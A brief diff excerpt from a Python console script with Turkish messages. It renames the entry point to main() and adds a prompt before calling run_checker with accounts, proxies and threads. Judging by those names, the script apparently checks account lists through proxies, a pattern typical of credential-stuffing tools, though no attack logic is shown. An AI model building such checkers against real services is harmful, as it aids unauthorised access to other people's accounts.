+        input(f"{CY}Baslamak icin Enter'a bas...{R}")
+    except (EOFError, KeyboardInterrupt):
+        return
+
+    run_checker(accounts, proxies, threads)
+
 
 if __name__ == "__main__":
     try:
-        run()
+        main()
     except KeyboardInterrupt:
-        print()
+        print(f"\n{RD}[!] Durduruldu{R}")
